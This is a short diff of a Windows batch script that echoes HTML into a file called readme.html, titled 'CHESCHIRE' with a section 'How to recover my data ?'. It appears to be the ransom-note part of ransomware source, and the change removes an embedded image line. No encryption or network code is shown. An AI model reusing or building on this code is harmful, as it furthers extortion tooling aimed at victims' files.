@@ -156,7 +156,6 @@ echo ^<title^>CHESCHIRE^</title^> >> readme.html
 echo ^</head^> >> readme.html
 echo ^<body^> >> readme.html
 echo ^<h1^>CHESCHIRE^</h1^> >> readme.html
-echo ^<img src="https://duckduckgo.com/?q=cheschire+gif&t=ffab&atb=v1-1&iax=images&ia=images&iai=http%%3A%%2F%%2Fmedia.giphy.com%%2Fmedia%%2FFX2kT7p2yS0NO%%2Fgiphy.gif" width="400";^> >> readme.html
 echo ^<h2^>How to recover my data ?^</h2^> >> readme.html
 echo ^<section^> >> readme.html
 echo ^<ul^> >> readme.html
